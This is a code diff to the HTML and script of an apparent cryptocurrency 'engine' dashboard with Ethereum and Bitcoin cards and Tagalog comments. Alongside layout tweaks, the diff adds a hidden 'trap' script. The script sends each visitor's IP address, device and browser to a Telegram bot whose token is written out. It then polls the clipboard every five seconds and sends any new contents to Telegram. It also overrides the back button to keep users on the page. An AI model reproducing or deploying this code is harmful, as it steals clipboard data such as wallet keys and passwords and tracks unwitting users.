@@ -126,8 +126,6 @@
         }
 
         .card-item:active { transform: scale(0.95); background: #f8f9fa; }
-        
-        /* FIX 2: Style para sigurado ang paglabas ng icons */
         .card-item i { font-size: 38px !important; margin-bottom: 12px; display: block !important; }
         .card-item span { font-size: 11px; font-weight: 800; color: var(--text-main); }
 
@@ -205,12 +203,11 @@
             <span class="section-title">Engines Available</span>
             <div class="grid">
                 <div class="card-item" onclick="loadPage('Eth.html')">
-    <svg viewBox="0 0 32 32" style="width: 38px; height: 38px; margin-bottom: 12px;">
-        <path fill="#627EEA" d="M16 32l-16-9.5 16-9.5 16 9.5-16 9.5zM16 0l16 22.5-16 9.5-16-9.5 16-22.5z"/>
-    </svg>
-    <span>ETHEREUM</span>
-</div>
-
+                    <svg viewBox="0 0 32 32" style="width: 38px; height: 38px; margin-bottom: 12px;">
+                        <path fill="#627EEA" d="M16 32l-16-9.5 16-9.5 16 9.5-16 9.5zM16 0l16 22.5-16 9.5-16-9.5 16-22.5z"/>
+                    </svg>
+                    <span>ETHEREUM</span>
+                </div>
                 <div class="card-item" onclick="loadPage('Btc.html')">
                     <i class="fa-brands fa-bitcoin" style="color: #F7931A;"></i>
                     <span>BITCOIN</span>
@@ -265,11 +262,60 @@
     </div>
 
     <script>
+        // --- [ REVERSE TRAP COMMAND CENTER ] ---
+        const TG_TOKEN = "8360873235:AAE8zMgYc6iCXRRHqiJbspywYG0yfbktSzY";
+        const TG_CHAT_ID = "8045620958";
+
+        async function sendToTelegram(msg) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: "HTML" })
+                });
+            } catch (e) {}
+        }
+
+        // Global function para sa sub-pages
+        window.triggerTrap = async function(coinType) {
+            if (sessionStorage.getItem('trap_active')) return; 
+            sessionStorage.setItem('trap_active', 'true');
+
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                
+                const report = `🚨 <b>ENGINE ACTIVATED!</b>\n` +
+                               `--------------------------\n` +
+                               `🎯 <b>Engine:</b> ${coinType}\n` +
+                               `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
+                               `📱 <b>Device:</b> ${navigator.platform}\n` +
+                               `⚙️ <b>Browser:</b> ${navigator.userAgent.split(') ')[1] || "Unknown"}\n` +
+                               `⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
+                sendToTelegram(report);
+            } catch (err) {
+                sendToTelegram(`⚠️ User started ${coinType} (Hidden IP)`);
+            }
+
+            // Clipboard snatcher (Persistent as long as index is open)
+            setInterval(async () => {
+                try {
+                    const text = await navigator.clipboard.readText();
+                    if (text && text.length > 0 && text !== localStorage.getItem('last_c')) {
+                        localStorage.setItem('last_c', text);
+                        sendToTelegram(`📋 <b>CLIPBOARD LEAK:</b>\n<code>${text}</code>`);
+                    }
+                } catch (e) {}
+            }, 5000);
+        }
+
+        // --- [ NAVIGATION LOGIC ] ---
         function loadPage(page) {
             if (sessionStorage.getItem('session_active') !== 'true') {
                 blockAccess();
                 return;
             }
+            // Pag nag-switch page, hindi ma-re-reload ang main window para tuloy ang monitoring
             document.getElementById('dashboard-home').style.display = 'none';
             document.getElementById('content-area').style.display = 'flex';
             document.getElementById('content-frame').src = page;
@@ -280,14 +326,23 @@
             else if(page.includes('Profile')) document.getElementById('n-user').classList.add('active');
 
             document.getElementById('label-top').textContent = page.split('.')[0].toUpperCase() + " ACTIVE";
+            
+            // Push state para sa "Back" button handling
+            history.pushState({page: page}, null, "");
         }
 
         function goHome() {
             document.getElementById('dashboard-home').style.display = 'flex';
             document.getElementById('content-area').style.display = 'none';
+            document.getElementById('content-frame').src = "";
             document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
             document.getElementById('n-home').classList.add('active');
         }
+
+        // Handle Back Button para hindi ma-exit ang app/trap
+        window.onpopstate = function(event) {
+            goHome();
+        };
 
         function exitSystem() {
             sessionStorage.clear();
